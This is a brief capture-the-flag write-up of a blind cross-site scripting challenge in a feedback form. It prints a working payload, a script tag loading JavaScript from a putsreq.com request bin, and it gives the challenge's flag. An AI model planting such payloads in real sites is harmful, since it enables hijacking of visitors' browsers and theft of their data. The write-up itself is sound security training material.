# XSS Challenge 2

### Author

[Mr.Un1k0d3r](https://twitter.com/mrun1k0d3r)

### Description

Our XSS Bot is only able to get out on ports 80 and 8080 to 8090 don't forget this little detail when you gonna build your payload. 
 
## Solution
 
Opening the challenge page we see a simple form where we can post our feedback. By the challenge title (and description) it is clear that we need to do a blind XSS. After a lot of tries using requestbin to generate a simple payload able to ping our bin we realized that requestbin listen only to https requests. Hence, we switched to putsreq and the simple payload
```
<script src=https://putsreq.com/aljcvfpHtSnOHC0kvx10></script>
```
gives us the flag `FLAG-q844e54902w2g4J13U4xl3410D`.
